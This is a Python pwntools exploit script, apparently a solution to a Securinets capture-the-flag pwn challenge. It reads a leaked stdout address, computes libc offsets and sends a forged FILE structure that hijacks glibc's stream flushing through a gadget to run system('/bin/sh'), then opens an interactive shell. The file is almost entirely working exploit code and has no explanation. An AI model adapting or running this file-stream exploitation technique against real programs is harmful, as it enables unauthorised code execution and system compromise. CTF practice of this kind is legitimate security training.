#!/usr/bin/env python3

from pwn import *

exe = ELF('./main_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
b *_IO_flush_all
b *_IO_flush_all+319
#b *_IO_flush_all+210
b *_IO_wdoallocbuf+35
'''

#p = remote("pwn-14caf623.p1.securinets.tn", 9002)
p = process('./main_patched')
#p = gdb.debug('./main_patched', gdbscript = script)
#debug()

rcu(b"stdout : ")
stdout = int(p.recvline(), 16)
libc_base = stdout - 0x1e85c0
lleak("libc_base", libc_base)

addr_stdout = stdout

# FIXME
addr_libc_base = addr_stdout - 0x1e85c0
addr_system = addr_libc_base + 0x53110
addr_stdfile_1_lock = addr_libc_base + 0x1e97b0
addr_gadget = addr_libc_base + 0x001563c3 # add rdi, 0x10; jmp rcx;

payload = flat({    
    0x0: 1, #  _flags
    0x8: addr_system + 0x4,             # _IO_read_ptr (_wide_data->_IO_write_base),
    0x10: addr_system + 0x3,            #_IO_read_end (_wide_data->_IO_write_ptr)
    0x20: 0,                            # _IO_write_base (_codecvt->__cd_out->step->__shlib_handle)
    0x28: 1,                            # _IO_write_ptr
    0x30: b'/bin/sh\0',                 # rdi + 0x10
    0x38: 0,                            # _IO_buf_base (_wide_data->_IO_backup_base)
    0x48: addr_gadget,                  # _IO_save_base (_codecvt->__cd_out->step->__fct)
    0x50: 0,                            # _IO_backup_base
    0x58: addr_stdout + 0x20,           # _IO_save_end (_codecvt->__cd_out->step) +0x60, +0x68, +0x80 will be overwitten
    0x88: addr_stdfile_1_lock,          # _lock
    0x98: addr_stdout + 0x58 - 0x38,    # _codecvt
    0xa0: addr_stdout + 0x8 - 0x18,     # _wide_data
    0xc0: 1,  # _mode
}, filler=b'\0', length=0xd8)

s(payload)

p.interactive()